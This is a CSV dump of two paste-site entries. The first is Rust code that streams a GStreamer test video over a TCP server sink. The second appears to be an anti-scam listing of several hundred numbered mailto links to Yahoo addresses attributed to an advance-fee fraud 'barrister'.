id,title,username,language,date,content
Sd6mXVfY,http stream,niedzwiedzw,Rust,Tuesday 27th of June 2023 12:58:37 PM CDT,"use eyre::{eyre, Result, WrapErr};
use gstreamer as gst;
use std::net::IpAddr;
use tracing::{error, info, instrument, warn};

use gst::{prelude::*, State};

#[derive(Clone, Debug)]
pub struct StreamConfig {
    pub host: IpAddr,
    pub port: u16,
}

pub struct GStreamerInstance {
    pub(crate) pipeline: gst::Pipeline,
}

impl std::fmt::Debug for GStreamerInstance {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct(std::any::type_name::<Self>())
            .field(""pipeline"", &self.pipeline.name().to_string())
            .finish_non_exhaustive()
    }
}

impl GStreamerInstance {
    #[instrument(skip(init), err)]
    pub fn new<F: Fn(&mut gst::Pipeline) -> Result<()>>(init: F) -> Result<Self> {
        info!(""creating a new GStreamer instance"");
        gst::init()
            .wrap_err(""initializing gstreamer"")
            .and_then(|_| {
                let mut pipeline = gst::Pipeline::new(Some(std::any::type_name::<Self>()));
                init(&mut pipeline)
                    .wrap_err(""pipeline init script"")
                    .map(|_| pipeline)
            })
            .map(|pipeline| Self { pipeline })
    }
}

impl Drop for GStreamerInstance {
    fn drop(&mut self) {
        warn!(""cleaning up the GStreamer instance"");
        if let Err(message) = self.pipeline.set_state(State::Null) {
            error!(?message, ""cleanup of GStreamer state has failed..."");
        }

        unsafe { gst::deinit() }
    }
}

#[derive(Debug)]
pub struct GStreamerStream {
    pub instance: GStreamerInstance,
    pub config: StreamConfig,
}

impl GStreamerStream {
    #[instrument(err)]
    pub async fn start_streaming(config: StreamConfig) -> Result<Self> {
        info!(""starting a new stream"");
        let StreamConfig { host, port } = config.clone();
        tokio::task::spawn_blocking(move || {
            GStreamerInstance::new(|pipeline| -> Result<()> {
                let src = gst::ElementFactory::make(""videotestsrc"")
                    .build()
                    .wrap_err(""initializing src"")?;
                let encoder = gst::ElementFactory::make(""x264enc"")
                    .build()
                    .wrap_err(""initializing encoder"")?;
                let muxer = gst::ElementFactory::make(""mpegtsmux"")
                    .build()
                    .wrap_err(""initializing muxer"")?;
                let sink = gst::ElementFactory::make(""tcpserversink"")
                    .build()
                    .wrap_err(""initializing sink"")?;

                // Set properties for the TCP server sink
                std::panic::catch_unwind(|| {
                    sink.set_property(""host"", &host.to_string());
                    sink.set_property(""port"", &(port as i32));
                })
                .map_err(|e| eyre!(""{e:?}""))
                .wrap_err(""setting network properties"")?;

                pipeline
                    .add_many(&[&src, &encoder, &muxer, &sink])
                    .wrap_err(""adding elements to pipeline"")?;

                gst::Element::link_many(&[&src, &encoder, &muxer, &sink])
                    .wrap_err(""linking elements"")?;

                // Set the pipeline to the playing state
                pipeline
                    .set_state(State::Playing)
                    .wrap_err(""setting the state"")?;

                // Start the main loop
                let main_loop = glib::MainLoop::new(None, false);
                info!(""starting the stream"");
                main_loop.run();
                Ok(())
            })
            .map(|instance| Self { instance, config })
        })
        .await
        .wrap_err(""thread_crashed"")
        .and_then(|r| r.wrap_err(""initializing stream""))
        .wrap_err(""starting the stream"")
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use test_log::test;
    #[test(tokio::test(flavor = ""multi_thread""))]
    async fn test_example_stream() -> Result<()> {
        let _stream = GStreamerStream::start_streaming(StreamConfig {
            host: [127, 0, 0, 1].into(),
            port: 7744,
        })
        .await;
        Ok(())
    }
}
"
HKCuH1RA,"Spam - Scam - 419 Advanced Fee Fraud - ""Barrister Javier Lopez""",bombaires,HTML,Tuesday 27th of June 2023 12:57:09 PM CDT,"<a href=""mailto:barristerjavierlopez1@yahoo.com"">barristerjavierlopez1@yahoo.com</a>
<a href=""mailto:barristerjavierlopez2@yahoo.com"">barristerjavierlopez2@yahoo.com</a>
<a href=""mailto:barristerjavierlopez3@yahoo.com"">barristerjavierlopez3@yahoo.com</a>
<a href=""mailto:barristerjavierlopez4@yahoo.com"">barristerjavierlopez4@yahoo.com</a>
<a href=""mailto:barristerjavierlopez5@yahoo.com"">barristerjavierlopez5@yahoo.com</a>
<a href=""mailto:barristerjavierlopez6@yahoo.com"">barristerjavierlopez6@yahoo.com</a>
<a href=""mailto:barristerjavierlopez7@yahoo.com"">barristerjavierlopez7@yahoo.com</a>
<a href=""mailto:barristerjavierlopez8@yahoo.com"">barristerjavierlopez8@yahoo.com</a>
<a href=""mailto:barristerjavierlopez9@yahoo.com"">barristerjavierlopez9@yahoo.com</a>
<a href=""mailto:barristerjavierlopez10@yahoo.com"">barristerjavierlopez10@yahoo.com</a>
<a href=""mailto:barristerjavierlopez11@yahoo.com"">barristerjavierlopez11@yahoo.com</a>
<a href=""mailto:barristerjavierlopez12@yahoo.com"">barristerjavierlopez12@yahoo.com</a>
<a href=""mailto:barristerjavierlopez13@yahoo.com"">barristerjavierlopez13@yahoo.com</a>
<a href=""mailto:barristerjavierlopez14@yahoo.com"">barristerjavierlopez14@yahoo.com</a>
<a href=""mailto:barristerjavierlopez15@yahoo.com"">barristerjavierlopez15@yahoo.com</a>
<a href=""mailto:barristerjavierlopez16@yahoo.com"">barristerjavierlopez16@yahoo.com</a>
<a href=""mailto:barristerjavierlopez17@yahoo.com"">barristerjavierlopez17@yahoo.com</a>
<a href=""mailto:barristerjavierlopez18@yahoo.com"">barristerjavierlopez18@yahoo.com</a>
<a href=""mailto:barristerjavierlopez19@yahoo.com"">barristerjavierlopez19@yahoo.com</a>
<a href=""mailto:barristerjavierlopez20@yahoo.com"">barristerjavierlopez20@yahoo.com</a>
<a href=""mailto:barristerjavierlopez21@yahoo.com"">barristerjavierlopez21@yahoo.com</a>
<a href=""mailto:barristerjavierlopez22@yahoo.com"">barristerjavierlopez22@yahoo.com</a>
<a href=""mailto:barristerjavierlopez23@yahoo.com"">barristerjavierlopez23@yahoo.com</a>
<a href=""mailto:barristerjavierlopez24@yahoo.com"">barristerjavierlopez24@yahoo.com</a>
<a href=""mailto:barristerjavierlopez25@yahoo.com"">barristerjavierlopez25@yahoo.com</a>
<a href=""mailto:barristerjavierlopez26@yahoo.com"">barristerjavierlopez26@yahoo.com</a>
<a href=""mailto:barristerjavierlopez27@yahoo.com"">barristerjavierlopez27@yahoo.com</a>
<a href=""mailto:barristerjavierlopez28@yahoo.com"">barristerjavierlopez28@yahoo.com</a>
<a href=""mailto:barristerjavierlopez29@yahoo.com"">barristerjavierlopez29@yahoo.com</a>
<a href=""mailto:barristerjavierlopez30@yahoo.com"">barristerjavierlopez30@yahoo.com</a>
<a href=""mailto:barristerjavierlopez31@yahoo.com"">barristerjavierlopez31@yahoo.com</a>
<a href=""mailto:barristerjavierlopez32@yahoo.com"">barristerjavierlopez32@yahoo.com</a>
<a href=""mailto:barristerjavierlopez33@yahoo.com"">barristerjavierlopez33@yahoo.com</a>
<a href=""mailto:barristerjavierlopez34@yahoo.com"">barristerjavierlopez34@yahoo.com</a>
<a href=""mailto:barristerjavierlopez35@yahoo.com"">barristerjavierlopez35@yahoo.com</a>
<a href=""mailto:barristerjavierlopez36@yahoo.com"">barristerjavierlopez36@yahoo.com</a>
<a href=""mailto:barristerjavierlopez37@yahoo.com"">barristerjavierlopez37@yahoo.com</a>
<a href=""mailto:barristerjavierlopez38@yahoo.com"">barristerjavierlopez38@yahoo.com</a>
<a href=""mailto:barristerjavierlopez39@yahoo.com"">barristerjavierlopez39@yahoo.com</a>
<a href=""mailto:barristerjavierlopez40@yahoo.com"">barristerjavierlopez40@yahoo.com</a>
<a href=""mailto:barristerjavierlopez41@yahoo.com"">barristerjavierlopez41@yahoo.com</a>
<a href=""mailto:barristerjavierlopez42@yahoo.com"">barristerjavierlopez42@yahoo.com</a>
<a href=""mailto:barristerjavierlopez43@yahoo.com"">barristerjavierlopez43@yahoo.com</a>
<a href=""mailto:barristerjavierlopez44@yahoo.com"">barristerjavierlopez44@yahoo.com</a>
<a href=""mailto:barristerjavierlopez45@yahoo.com"">barristerjavierlopez45@yahoo.com</a>
<a href=""mailto:barristerjavierlopez46@yahoo.com"">barristerjavierlopez46@yahoo.com</a>
<a href=""mailto:barristerjavierlopez47@yahoo.com"">barristerjavierlopez47@yahoo.com</a>
<a href=""mailto:barristerjavierlopez48@yahoo.com"">barristerjavierlopez48@yahoo.com</a>
<a href=""mailto:barristerjavierlopez49@yahoo.com"">barristerjavierlopez49@yahoo.com</a>
<a href=""mailto:barristerjavierlopez50@yahoo.com"">barristerjavierlopez50@yahoo.com</a>
<a href=""mailto:barristerjavierlopez51@yahoo.com"">barristerjavierlopez51@yahoo.com</a>
<a href=""mailto:barristerjavierlopez52@yahoo.com"">barristerjavierlopez52@yahoo.com</a>
<a href=""mailto:barristerjavierlopez53@yahoo.com"">barristerjavierlopez53@yahoo.com</a>
<a href=""mailto:barristerjavierlopez54@yahoo.com"">barristerjavierlopez54@yahoo.com</a>
<a href=""mailto:barristerjavierlopez55@yahoo.com"">barristerjavierlopez55@yahoo.com</a>
<a href=""mailto:barristerjavierlopez56@yahoo.com"">barristerjavierlopez56@yahoo.com</a>
<a href=""mailto:barristerjavierlopez57@yahoo.com"">barristerjavierlopez57@yahoo.com</a>
<a href=""mailto:barristerjavierlopez58@yahoo.com"">barristerjavierlopez58@yahoo.com</a>
<a href=""mailto:barristerjavierlopez59@yahoo.com"">barristerjavierlopez59@yahoo.com</a>
<a href=""mailto:barristerjavierlopez60@yahoo.com"">barristerjavierlopez60@yahoo.com</a>
<a href=""mailto:barristerjavierlopez61@yahoo.com"">barristerjavierlopez61@yahoo.com</a>
<a href=""mailto:barristerjavierlopez62@yahoo.com"">barristerjavierlopez62@yahoo.com</a>
<a href=""mailto:barristerjavierlopez63@yahoo.com"">barristerjavierlopez63@yahoo.com</a>
<a href=""mailto:barristerjavierlopez64@yahoo.com"">barristerjavierlopez64@yahoo.com</a>
<a href=""mailto:barristerjavierlopez65@yahoo.com"">barristerjavierlopez65@yahoo.com</a>
<a href=""mailto:barristerjavierlopez66@yahoo.com"">barristerjavierlopez66@yahoo.com</a>
<a href=""mailto:barristerjavierlopez67@yahoo.com"">barristerjavierlopez67@yahoo.com</a>
<a href=""mailto:barristerjavierlopez68@yahoo.com"">barristerjavierlopez68@yahoo.com</a>
<a href=""mailto:barristerjavierlopez69@yahoo.com"">barristerjavierlopez69@yahoo.com</a>
<a href=""mailto:barristerjavierlopez70@yahoo.com"">barristerjavierlopez70@yahoo.com</a>
<a href=""mailto:barristerjavierlopez71@yahoo.com"">barristerjavierlopez71@yahoo.com</a>
<a href=""mailto:barristerjavierlopez72@yahoo.com"">barristerjavierlopez72@yahoo.com</a>
<a href=""mailto:barristerjavierlopez73@yahoo.com"">barristerjavierlopez73@yahoo.com</a>
<a href=""mailto:barristerjavierlopez74@yahoo.com"">barristerjavierlopez74@yahoo.com</a>
<a href=""mailto:barristerjavierlopez75@yahoo.com"">barristerjavierlopez75@yahoo.com</a>
<a href=""mailto:barristerjavierlopez76@yahoo.com"">barristerjavierlopez76@yahoo.com</a>
<a href=""mailto:barristerjavierlopez77@yahoo.com"">barristerjavierlopez77@yahoo.com</a>
<a href=""mailto:barristerjavierlopez78@yahoo.com"">barristerjavierlopez78@yahoo.com</a>
<a href=""mailto:barristerjavierlopez79@yahoo.com"">barristerjavierlopez79@yahoo.com</a>
<a href=""mailto:barristerjavierlopez80@yahoo.com"">barristerjavierlopez80@yahoo.com</a>
<a href=""mailto:barristerjavierlopez81@yahoo.com"">barristerjavierlopez81@yahoo.com</a>
<a href=""mailto:barristerjavierlopez82@yahoo.com"">barristerjavierlopez82@yahoo.com</a>
<a href=""mailto:barristerjavierlopez83@yahoo.com"">barristerjavierlopez83@yahoo.com</a>
<a href=""mailto:barristerjavierlopez84@yahoo.com"">barristerjavierlopez84@yahoo.com</a>
<a href=""mailto:barristerjavierlopez85@yahoo.com"">barristerjavierlopez85@yahoo.com</a>
<a href=""mailto:barristerjavierlopez86@yahoo.com"">barristerjavierlopez86@yahoo.com</a>
<a href=""mailto:barristerjavierlopez87@yahoo.com"">barristerjavierlopez87@yahoo.com</a>
<a href=""mailto:barristerjavierlopez88@yahoo.com"">barristerjavierlopez88@yahoo.com</a>
<a href=""mailto:barristerjavierlopez89@yahoo.com"">barristerjavierlopez89@yahoo.com</a>
<a href=""mailto:barristerjavierlopez90@yahoo.com"">barristerjavierlopez90@yahoo.com</a>
<a href=""mailto:barristerjavierlopez91@yahoo.com"">barristerjavierlopez91@yahoo.com</a>
<a href=""mailto:barristerjavierlopez92@yahoo.com"">barristerjavierlopez92@yahoo.com</a>
<a href=""mailto:barristerjavierlopez93@yahoo.com"">barristerjavierlopez93@yahoo.com</a>
<a href=""mailto:barristerjavierlopez94@yahoo.com"">barristerjavierlopez94@yahoo.com</a>
<a href=""mailto:barristerjavierlopez95@yahoo.com"">barristerjavierlopez95@yahoo.com</a>
<a href=""mailto:barristerjavierlopez96@yahoo.com"">barristerjavierlopez96@yahoo.com</a>
<a href=""mailto:barristerjavierlopez97@yahoo.com"">barristerjavierlopez97@yahoo.com</a>
<a href=""mailto:barristerjavierlopez98@yahoo.com"">barristerjavierlopez98@yahoo.com</a>
<a href=""mailto:barristerjavierlopez99@yahoo.com"">barristerjavierlopez99@yahoo.com</a>
<a href=""mailto:barristerjavierlopez100@yahoo.com"">barristerjavierlopez100@yahoo.com</a>
<a href=""mailto:barristerjavierlopez101@yahoo.com"">barristerjavierlopez101@yahoo.com</a>
<a href=""mailto:barristerjavierlopez102@yahoo.com"">barristerjavierlopez102@yahoo.com</a>
<a href=""mailto:barristerjavierlopez103@yahoo.com"">barristerjavierlopez103@yahoo.com</a>
<a href=""mailto:barristerjavierlopez104@yahoo.com"">barristerjavierlopez104@yahoo.com</a>
<a href=""mailto:barristerjavierlopez105@yahoo.com"">barristerjavierlopez105@yahoo.com</a>
<a href=""mailto:barristerjavierlopez106@yahoo.com"">barristerjavierlopez106@yahoo.com</a>
<a href=""mailto:barristerjavierlopez107@yahoo.com"">barristerjavierlopez107@yahoo.com</a>
<a href=""mailto:barristerjavierlopez108@yahoo.com"">barristerjavierlopez108@yahoo.com</a>
<a href=""mailto:barristerjavierlopez109@yahoo.com"">barristerjavierlopez109@yahoo.com</a>
<a href=""mailto:barristerjavierlopez110@yahoo.com"">barristerjavierlopez110@yahoo.com</a>
<a href=""mailto:barristerjavierlopez111@yahoo.com"">barristerjavierlopez111@yahoo.com</a>
<a href=""mailto:barristerjavierlopez112@yahoo.com"">barristerjavierlopez112@yahoo.com</a>
<a href=""mailto:barristerjavierlopez113@yahoo.com"">barristerjavierlopez113@yahoo.com</a>
<a href=""mailto:barristerjavierlopez114@yahoo.com"">barristerjavierlopez114@yahoo.com</a>
<a href=""mailto:barristerjavierlopez115@yahoo.com"">barristerjavierlopez115@yahoo.com</a>
<a href=""mailto:barristerjavierlopez116@yahoo.com"">barristerjavierlopez116@yahoo.com</a>
<a href=""mailto:barristerjavierlopez117@yahoo.com"">barristerjavierlopez117@yahoo.com</a>
<a href=""mailto:barristerjavierlopez118@yahoo.com"">barristerjavierlopez118@yahoo.com</a>
<a href=""mailto:barristerjavierlopez119@yahoo.com"">barristerjavierlopez119@yahoo.com</a>
<a href=""mailto:barristerjavierlopez120@yahoo.com"">barristerjavierlopez120@yahoo.com</a>
<a href=""mailto:barristerjavierlopez121@yahoo.com"">barristerjavierlopez121@yahoo.com</a>
<a href=""mailto:barristerjavierlopez122@yahoo.com"">barristerjavierlopez122@yahoo.com</a>
<a href=""mailto:barristerjavierlopez123@yahoo.com"">barristerjavierlopez123@yahoo.com</a>
<a href=""mailto:barristerjavierlopez124@yahoo.com"">barristerjavierlopez124@yahoo.com</a>
<a href=""mailto:barristerjavierlopez125@yahoo.com"">barristerjavierlopez125@yahoo.com</a>
<a href=""mailto:barristerjavierlopez126@yahoo.com"">barristerjavierlopez126@yahoo.com</a>
<a href=""mailto:barristerjavierlopez127@yahoo.com"">barristerjavierlopez127@yahoo.com</a>
<a href=""mailto:barristerjavierlopez128@yahoo.com"">barristerjavierlopez128@yahoo.com</a>
<a href=""mailto:barristerjavierlopez129@yahoo.com"">barristerjavierlopez129@yahoo.com</a>
<a href=""mailto:barristerjavierlopez130@yahoo.com"">barristerjavierlopez130@yahoo.com</a>
<a href=""mailto:barristerjavierlopez131@yahoo.com"">barristerjavierlopez131@yahoo.com</a>
<a href=""mailto:barristerjavierlopez132@yahoo.com"">barristerjavierlopez132@yahoo.com</a>
<a href=""mailto:barristerjavierlopez133@yahoo.com"">barristerjavierlopez133@yahoo.com</a>
<a href=""mailto:barristerjavierlopez134@yahoo.com"">barristerjavierlopez134@yahoo.com</a>
<a href=""mailto:barristerjavierlopez135@yahoo.com"">barristerjavierlopez135@yahoo.com</a>
<a href=""mailto:barristerjavierlopez136@yahoo.com"">barristerjavierlopez136@yahoo.com</a>
<a href=""mailto:barristerjavierlopez137@yahoo.com"">barristerjavierlopez137@yahoo.com</a>
<a href=""mailto:barristerjavierlopez138@yahoo.com"">barristerjavierlopez138@yahoo.com</a>
<a href=""mailto:barristerjavierlopez139@yahoo.com"">barristerjavierlopez139@yahoo.com</a>
<a href=""mailto:barristerjavierlopez140@yahoo.com"">barristerjavierlopez140@yahoo.com</a>
<a href=""mailto:barristerjavierlopez141@yahoo.com"">barristerjavierlopez141@yahoo.com</a>
<a href=""mailto:barristerjavierlopez142@yahoo.com"">barristerjavierlopez142@yahoo.com</a>
<a href=""mailto:barristerjavierlopez143@yahoo.com"">barristerjavierlopez143@yahoo.com</a>
<a href=""mailto:barristerjavierlopez144@yahoo.com"">barristerjavierlopez144@yahoo.com</a>
<a href=""mailto:barristerjavierlopez145@yahoo.com"">barristerjavierlopez145@yahoo.com</a>
<a href=""mailto:barristerjavierlopez146@yahoo.com"">barristerjavierlopez146@yahoo.com</a>
<a href=""mailto:barristerjavierlopez147@yahoo.com"">barristerjavierlopez147@yahoo.com</a>
<a href=""mailto:barristerjavierlopez148@yahoo.com"">barristerjavierlopez148@yahoo.com</a>
<a href=""mailto:barristerjavierlopez149@yahoo.com"">barristerjavierlopez149@yahoo.com</a>
<a href=""mailto:barristerjavierlopez150@yahoo.com"">barristerjavierlopez150@yahoo.com</a>
<a href=""mailto:barristerjavierlopez151@yahoo.com"">barristerjavierlopez151@yahoo.com</a>
<a href=""mailto:barristerjavierlopez152@yahoo.com"">barristerjavierlopez152@yahoo.com</a>
<a href=""mailto:barristerjavierlopez153@yahoo.com"">barristerjavierlopez153@yahoo.com</a>
<a href=""mailto:barristerjavierlopez154@yahoo.com"">barristerjavierlopez154@yahoo.com</a>
<a href=""mailto:barristerjavierlopez155@yahoo.com"">barristerjavierlopez155@yahoo.com</a>
<a href=""mailto:barristerjavierlopez156@yahoo.com"">barristerjavierlopez156@yahoo.com</a>
<a href=""mailto:barristerjavierlopez157@yahoo.com"">barristerjavierlopez157@yahoo.com</a>
<a href=""mailto:barristerjavierlopez158@yahoo.com"">barristerjavierlopez158@yahoo.com</a>
<a href=""mailto:barristerjavierlopez159@yahoo.com"">barristerjavierlopez159@yahoo.com</a>
<a href=""mailto:barristerjavierlopez160@yahoo.com"">barristerjavierlopez160@yahoo.com</a>
<a href=""mailto:barristerjavierlopez161@yahoo.com"">barristerjavierlopez161@yahoo.com</a>
<a href=""mailto:barristerjavierlopez162@yahoo.com"">barristerjavierlopez162@yahoo.com</a>
<a href=""mailto:barristerjavierlopez163@yahoo.com"">barristerjavierlopez163@yahoo.com</a>
<a href=""mailto:barristerjavierlopez164@yahoo.com"">barristerjavierlopez164@yahoo.com</a>
<a href=""mailto:barristerjavierlopez165@yahoo.com"">barristerjavierlopez165@yahoo.com</a>
<a href=""mailto:barristerjavierlopez166@yahoo.com"">barristerjavierlopez166@yahoo.com</a>
<a href=""mailto:barristerjavierlopez167@yahoo.com"">barristerjavierlopez167@yahoo.com</a>
<a href=""mailto:barristerjavierlopez168@yahoo.com"">barristerjavierlopez168@yahoo.com</a>
<a href=""mailto:barristerjavierlopez169@yahoo.com"">barristerjavierlopez169@yahoo.com</a>
<a href=""mailto:barristerjavierlopez170@yahoo.com"">barristerjavierlopez170@yahoo.com</a>
<a href=""mailto:barristerjavierlopez171@yahoo.com"">barristerjavierlopez171@yahoo.com</a>
<a href=""mailto:barristerjavierlopez172@yahoo.com"">barristerjavierlopez172@yahoo.com</a>
<a href=""mailto:barristerjavierlopez173@yahoo.com"">barristerjavierlopez173@yahoo.com</a>
<a href=""mailto:barristerjavierlopez174@yahoo.com"">barristerjavierlopez174@yahoo.com</a>
<a href=""mailto:barristerjavierlopez175@yahoo.com"">barristerjavierlopez175@yahoo.com</a>
<a href=""mailto:barristerjavierlopez176@yahoo.com"">barristerjavierlopez176@yahoo.com</a>
<a href=""mailto:barristerjavierlopez177@yahoo.com"">barristerjavierlopez177@yahoo.com</a>
<a href=""mailto:barristerjavierlopez178@yahoo.com"">barristerjavierlopez178@yahoo.com</a>
<a href=""mailto:barristerjavierlopez179@yahoo.com"">barristerjavierlopez179@yahoo.com</a>
<a href=""mailto:barristerjavierlopez180@yahoo.com"">barristerjavierlopez180@yahoo.com</a>
<a href=""mailto:barristerjavierlopez181@yahoo.com"">barristerjavierlopez181@yahoo.com</a>
<a href=""mailto:barristerjavierlopez182@yahoo.com"">barristerjavierlopez182@yahoo.com</a>
<a href=""mailto:barristerjavierlopez183@yahoo.com"">barristerjavierlopez183@yahoo.com</a>
<a href=""mailto:barristerjavierlopez184@yahoo.com"">barristerjavierlopez184@yahoo.com</a>
<a href=""mailto:barristerjavierlopez185@yahoo.com"">barristerjavierlopez185@yahoo.com</a>
<a href=""mailto:barristerjavierlopez186@yahoo.com"">barristerjavierlopez186@yahoo.com</a>
<a href=""mailto:barristerjavierlopez187@yahoo.com"">barristerjavierlopez187@yahoo.com</a>
<a href=""mailto:barristerjavierlopez188@yahoo.com"">barristerjavierlopez188@yahoo.com</a>
<a href=""mailto:barristerjavierlopez189@yahoo.com"">barristerjavierlopez189@yahoo.com</a>
<a href=""mailto:barristerjavierlopez190@yahoo.com"">barristerjavierlopez190@yahoo.com</a>
<a href=""mailto:barristerjavierlopez191@yahoo.com"">barristerjavierlopez191@yahoo.com</a>
<a href=""mailto:barristerjavierlopez192@yahoo.com"">barristerjavierlopez192@yahoo.com</a>
<a href=""mailto:barristerjavierlopez193@yahoo.com"">barristerjavierlopez193@yahoo.com</a>
<a href=""mailto:barristerjavierlopez194@yahoo.com"">barristerjavierlopez194@yahoo.com</a>
<a href=""mailto:barristerjavierlopez195@yahoo.com"">barristerjavierlopez195@yahoo.com</a>
<a href=""mailto:barristerjavierlopez196@yahoo.com"">barristerjavierlopez196@yahoo.com</a>
<a href=""mailto:barristerjavierlopez197@yahoo.com"">barristerjavierlopez197@yahoo.com</a>
<a href=""mailto:barristerjavierlopez198@yahoo.com"">barristerjavierlopez198@yahoo.com</a>
<a href=""mailto:barristerjavierlopez199@yahoo.com"">barristerjavierlopez199@yahoo.com</a>
<a href=""mailto:barristerjavierlopez200@yahoo.com"">barristerjavierlopez200@yahoo.com</a>
<a href=""mailto:barristerjavierlopez201@yahoo.com"">barristerjavierlopez201@yahoo.com</a>
<a href=""mailto:barristerjavierlopez202@yahoo.com"">barristerjavierlopez202@yahoo.com</a>
<a href=""mailto:barristerjavierlopez203@yahoo.com"">barristerjavierlopez203@yahoo.com</a>
<a href=""mailto:barristerjavierlopez204@yahoo.com"">barristerjavierlopez204@yahoo.com</a>
<a href=""mailto:barristerjavierlopez205@yahoo.com"">barristerjavierlopez205@yahoo.com</a>
<a href=""mailto:barristerjavierlopez206@yahoo.com"">barristerjavierlopez206@yahoo.com</a>
<a href=""mailto:barristerjavierlopez207@yahoo.com"">barristerjavierlopez207@yahoo.com</a>
<a href=""mailto:barristerjavierlopez208@yahoo.com"">barristerjavierlopez208@yahoo.com</a>
<a href=""mailto:barristerjavierlopez209@yahoo.com"">barristerjavierlopez209@yahoo.com</a>
<a href=""mailto:barristerjavierlopez210@yahoo.com"">barristerjavierlopez210@yahoo.com</a>
<a href=""mailto:barristerjavierlopez211@yahoo.com"">barristerjavierlopez211@yahoo.com</a>
<a href=""mailto:barristerjavierlopez212@yahoo.com"">barristerjavierlopez212@yahoo.com</a>
<a href=""mailto:barristerjavierlopez213@yahoo.com"">barristerjavierlopez213@yahoo.com</a>
<a href=""mailto:barristerjavierlopez214@yahoo.com"">barristerjavierlopez214@yahoo.com</a>
<a href=""mailto:barristerjavierlopez215@yahoo.com"">barristerjavierlopez215@yahoo.com</a>
<a href=""mailto:barristerjavierlopez216@yahoo.com"">barristerjavierlopez216@yahoo.com</a>
<a href=""mailto:barristerjavierlopez217@yahoo.com"">barristerjavierlopez217@yahoo.com</a>
<a href=""mailto:barristerjavierlopez218@yahoo.com"">barristerjavierlopez218@yahoo.com</a>
<a href=""mailto:barristerjavierlopez219@yahoo.com"">barristerjavierlopez219@yahoo.com</a>
<a href=""mailto:barristerjavierlopez220@yahoo.com"">barristerjavierlopez220@yahoo.com</a>
<a href=""mailto:barristerjavierlopez221@yahoo.com"">barristerjavierlopez221@yahoo.com</a>
<a href=""mailto:barristerjavierlopez222@yahoo.com"">barristerjavierlopez222@yahoo.com</a>
<a href=""mailto:barristerjavierlopez223@yahoo.com"">barristerjavierlopez223@yahoo.com</a>
<a href=""mailto:barristerjavierlopez224@yahoo.com"">barristerjavierlopez224@yahoo.com</a>
<a href=""mailto:barristerjavierlopez225@yahoo.com"">barristerjavierlopez225@yahoo.com</a>
<a href=""mailto:barristerjavierlopez226@yahoo.com"">barristerjavierlopez226@yahoo.com</a>
<a href=""mailto:barristerjavierlopez227@yahoo.com"">barristerjavierlopez227@yahoo.com</a>
<a href=""mailto:barristerjavierlopez228@yahoo.com"">barristerjavierlopez228@yahoo.com</a>
<a href=""mailto:barristerjavierlopez229@yahoo.com"">barristerjavierlopez229@yahoo.com</a>
<a href=""mailto:barristerjavierlopez230@yahoo.com"">barristerjavierlopez230@yahoo.com</a>
<a href=""mailto:barristerjavierlopez231@yahoo.com"">barristerjavierlopez231@yahoo.com</a>
<a href=""mailto:barristerjavierlopez232@yahoo.com"">barristerjavierlopez232@yahoo.com</a>
<a href=""mailto:barristerjavierlopez233@yahoo.com"">barristerjavierlopez233@yahoo.com</a>
<a href=""mailto:barristerjavierlopez234@yahoo.com"">barristerjavierlopez234@yahoo.com</a>
<a href=""mailto:barristerjavierlopez235@yahoo.com"">barristerjavierlopez235@yahoo.com</a>
<a href=""mailto:barristerjavierlopez236@yahoo.com"">barristerjavierlopez236@yahoo.com</a>
<a href=""mailto:barristerjavierlopez237@yahoo.com"">barristerjavierlopez237@yahoo.com</a>
<a href=""mailto:barristerjavierlopez238@yahoo.com"">barristerjavierlopez238@yahoo.com</a>
<a href=""mailto:barristerjavierlopez239@yahoo.com"">barristerjavierlopez239@yahoo.com</a>
<a href=""mailto:barristerjavierlopez240@yahoo.com"">barristerjavierlopez240@yahoo.com</a>
<a href=""mailto:barristerjavierlopez241@yahoo.com"">barristerjavierlopez241@yahoo.com</a>
<a href=""mailto:barristerjavierlopez242@yahoo.com"">barristerjavierlopez242@yahoo.com</a>
<a href=""mailto:barristerjavierlopez243@yahoo.com"">barristerjavierlopez243@yahoo.com</a>
<a href=""mailto:barristerjavierlopez244@yahoo.com"">barristerjavierlopez244@yahoo.com</a>
<a href=""mailto:barristerjavierlopez245@yahoo.com"">barristerjavierlopez245@yahoo.com</a>
<a href=""mailto:barristerjavierlopez246@yahoo.com"">barristerjavierlopez246@yahoo.com</a>
<a href=""mailto:barristerjavierlopez247@yahoo.com"">barristerjavierlopez247@yahoo.com</a>
<a href=""mailto:barristerjavierlopez248@yahoo.com"">barristerjavierlopez248@yahoo.com</a>
<a href=""mailto:barristerjavierlopez249@yahoo.com"">barristerjavierlopez249@yahoo.com</a>
<a href=""mailto:barristerjavierlopez250@yahoo.com"">barristerjavierlopez250@yahoo.com</a>
<a href=""mailto:barristerjavierlopez251@yahoo.com"">barristerjavierlopez251@yahoo.com</a>
<a href=""mailto:barristerjavierlopez252@yahoo.com"">barristerjavierlopez252@yahoo.com</a>
<a href=""mailto:barristerjavierlopez253@yahoo.com"">barristerjavierlopez253@yahoo.com</a>
<a href=""mailto:barristerjavierlopez254@yahoo.com"">barristerjavierlopez254@yahoo.com</a>
<a href=""mailto:barristerjavierlopez255@yahoo.com"">barristerjavierlopez255@yahoo.com</a>
<a href=""mailto:barristerjavierlopez256@yahoo.com"">barristerjavierlopez256@yahoo.com</a>
<a href=""mailto:barristerjavierlopez257@yahoo.com"">barristerjavierlopez257@yahoo.com</a>
<a href=""mailto:barristerjavierlopez258@yahoo.com"">barristerjavierlopez258@yahoo.com</a>
<a href=""mailto:barristerjavierlopez259@yahoo.com"">barristerjavierlopez259@yahoo.com</a>
<a href=""mailto:barristerjavierlopez260@yahoo.com"">barristerjavierlopez260@yahoo.com</a>
<a href=""mailto:barristerjavierlopez261@yahoo.com"">barristerjavierlopez261@yahoo.com</a>
<a href=""mailto:barristerjavierlopez262@yahoo.com"">barristerjavierlopez262@yahoo.com</a>
<a href=""mailto:barristerjavierlopez263@yahoo.com"">barristerjavierlopez263@yahoo.com</a>
<a href=""mailto:barristerjavierlopez264@yahoo.com"">barristerjavierlopez264@yahoo.com</a>
<a href=""mailto:barristerjavierlopez265@yahoo.com"">barristerjavierlopez265@yahoo.com</a>
<a href=""mailto:barristerjavierlopez266@yahoo.com"">barristerjavierlopez266@yahoo.com</a>
<a href=""mailto:barristerjavierlopez267@yahoo.com"">barristerjavierlopez267@yahoo.com</a>
<a href=""mailto:barristerjavierlopez268@yahoo.com"">barristerjavierlopez268@yahoo.com</a>
<a href=""mailto:barristerjavierlopez269@yahoo.com"">barristerjavierlopez269@yahoo.com</a>
